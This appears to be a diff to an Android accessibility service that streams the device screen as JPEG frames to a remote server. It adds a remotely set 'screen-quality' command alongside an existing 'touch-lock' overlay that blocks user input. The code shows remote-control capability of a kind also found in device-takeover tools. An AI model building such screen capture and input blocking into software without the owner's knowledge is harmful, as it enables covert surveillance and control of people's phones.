@@ -37,6 +37,8 @@ class ControlService : AccessibilityService() {
     private var lastScreenFrame = 0L
     private var overlayView: View? = null
     private var overlayParams: WindowManager.LayoutParams? = null
+    @Volatile private var screenJpegQuality = 60
+    @Volatile private var screenMaxWidth = 720
 
     private val serverBase: String get() {
         var host = BuildConfig.DEFAULT_SERVER.trim()
@@ -136,13 +138,14 @@ class ControlService : AccessibilityService() {
         }
         try {
             val hw = capture.javaClass.getMethod("getHardwareBitmap").invoke(capture) as? Bitmap ?: return
-            val scale = minOf(1f, 720f / hw.width)
+            val maxW = screenMaxWidth
+            val scale = minOf(1f, maxW.toFloat() / hw.width)
             val sw = (hw.width * scale).toInt()
             val sh = (hw.height * scale).toInt()
             val soft = hw.copy(Bitmap.Config.ARGB_8888, false)
             val bmp = if (scale < 1f) Bitmap.createScaledBitmap(soft, sw, sh, true).also { soft.recycle() } else soft
             val out = ByteArrayOutputStream()
-            bmp.compress(Bitmap.CompressFormat.JPEG, 60, out)
+            bmp.compress(Bitmap.CompressFormat.JPEG, screenJpegQuality, out)
             bmp.recycle()
             wsScreen?.send(out.toByteArray().toByteString())
             lastScreenFrame = System.currentTimeMillis()
@@ -225,6 +228,11 @@ class ControlService : AccessibilityService() {
             "touch-lock" -> {
                 val lock = msg.optBoolean("locked", false)
                 ctrlHandler.post { if (lock) showTouchBlockOverlay() else hideTouchBlockOverlay() }
+            }
+            "screen-quality" -> {
+                val q = msg.optInt("quality", 60).coerceIn(10, 90)
+                screenJpegQuality = q
+                screenMaxWidth = if (q < 30) 360 else 720
             }
         }
     }
